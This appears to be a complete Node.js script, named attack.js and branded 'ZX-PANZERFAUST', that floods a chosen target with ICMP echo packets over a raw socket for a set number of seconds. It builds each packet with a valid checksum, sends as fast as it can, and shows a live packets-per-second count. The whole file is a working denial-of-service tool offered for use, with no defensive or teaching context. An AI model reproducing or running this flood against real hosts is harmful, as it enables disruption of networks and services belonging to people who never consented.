const raw = require('raw-socket');
const process = require('process');

const [target, time] = process.argv.slice(2);
if (!target || !time) {
    console.log("Usage: node attack.js <target> <time>");
    process.exit(1);
}

process.stdout.write('\x1Bc');

const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });

let pings = 0;
let packets = 0;
let lastPings = 0;
let lastPackets = 0;
const endTime = Date.now() + (parseInt(time) * 1000);

const createPacket = () => {
    const buffer = Buffer.alloc(64);
    buffer.writeUInt8(8, 0);
    buffer.writeUInt8(0, 1);
    buffer.writeUInt16BE(0, 2);
    buffer.writeUInt16BE(process.pid & 0xffff, 4);
    buffer.writeUInt16BE(pings & 0xffff, 6);
    for (let i = 8; i < 64; i++) buffer[i] = i % 255;

    let sum = 0;
    for (let i = 0; i < buffer.length; i += 2) sum += buffer.readUInt16BE(i);
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    const checksum = ~sum & 0xffff;
    buffer.writeUInt16BE(checksum, 2);
    return buffer;
};

const blast = () => {
    if (Date.now() > endTime) {
        process.stdout.write(`\nZX-PANZERFAUST DONE\npings: ${pings}\npackets: ${packets}\n`);
        process.exit(0);
    }

    try {
        const packet = createPacket();
        socket.send(packet, 0, packet.length, target, () => {});
        pings++;
        packets++;
    } catch (e) {}

    setImmediate(blast);
};

setInterval(() => {
    const pps = pings - lastPings;
    const pktps = packets - lastPackets;
    lastPings = pings;
    lastPackets = packets;

    process.stdout.write(`\x1BcZX-PANZERFAUST\npings: ${pings}\npackets: ${packets}\npings per second: ${pps}\npackets per second: ${pktps}\n`);
}, 2000);

blast();
